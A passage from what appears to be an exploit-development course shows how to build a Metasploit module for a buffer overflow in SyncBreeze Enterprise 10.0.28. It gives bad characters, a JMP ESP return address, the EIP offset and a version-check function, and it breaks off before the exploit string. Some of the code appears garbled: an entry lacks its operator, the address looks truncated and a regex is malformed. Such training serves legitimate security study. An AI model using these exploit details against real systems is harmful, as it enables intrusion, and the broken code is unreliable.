![](bbox=[0.115, 0.043, 0.285, 0.083])

```
```ruby
'License'          => MSF_LICENSE,
'Author'           => [ 'Offensive Security', 'offsec' ],
'References'       =>
    [
      [ 'EDB', '42886' ]
],
```
Listing 789 - Metasploit module header information
```

In the next section, we will select the default options. In this case, we will set EXITFUNC to “thread” and specify the bad characters we found, which are \x00\x0a\x0d\x25\x26\x2b\x3d. Finally, in the Targets section, we will specify the version of SyncBreeze along with the address of the JMP ESP instruction and the offset used to overwrite EIP.

```
```ruby
'DefaultOptions' =>
{
   'EXITFUNC' => 'thread'
},
'Platform'         => 'win',
'Payload'
{
    'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",'Space'     => 500
},
'Targets'          =>
[
   [ 'SyncBreeze Enterprise 10.0.28',
{
      'Ret' => 0x1009c83, # JMP ESP -- libbssp.dll
'Offset' => 780
}] 
],
```
Listing 790 - Metasploit module options and settings
```

Next, we will update the check function, which is done by performing a HTTP GET request to the URL /. On a vulnerable system, the result contains the text “Sync Breeze Enterprise v10.0.28”.

```
```ruby
def check
  res = send_request_cgi(
    'uri'      => '/',
    'method'   => 'GET'
  )

if res && res.code == 200
product_name = res.body.scan(/(Sync Breeze Enterprise v[\^<*>]/i).flatten.first
if product_name =~ /10\.0\.28/
return Exploit::CheckCode::Appears
end
end

return Exploit::CheckCode::Safe
end
```
Listing 791 - The check function for our module
```

The final section is the exploit itself. First, we will create the exploit string, which uses the offset and the memory address for the JMP ESP instruction along with a NOP sled and the payload. Then